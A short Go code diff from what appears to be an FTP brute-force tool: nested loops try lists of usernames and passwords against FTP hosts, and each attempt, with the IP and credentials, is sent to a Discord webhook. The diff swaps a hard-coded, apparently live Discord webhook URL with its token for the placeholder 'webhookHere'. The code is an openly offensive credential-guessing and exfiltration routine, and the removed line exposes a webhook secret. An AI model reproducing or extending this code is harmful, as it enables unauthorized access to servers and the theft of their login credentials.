@@ -48,7 +48,7 @@ func ConnectToFTP() {
 		for _, username := range usernames {
 			for _, password := range passwords {
 				err := connection.Login(username, password)
-				webhook := "https://discord.com/api/webhooks/1356857871215890452/TUSPalcrGvLv6urWFtTM4mbxHNR34wYeMPwu40nmZjxz3_elHiIlboGfvafO5Ng4OMMm"
+				webhook := "webhookHere"
 				cmd.SendWebhookMessage(webhook, fmt.Sprintf("Connecting to %s on port %d with username %s and password %s", ip, 21, username, password))
 				fmt.Println("Logged in on: ", ip)
 				if err != nil {
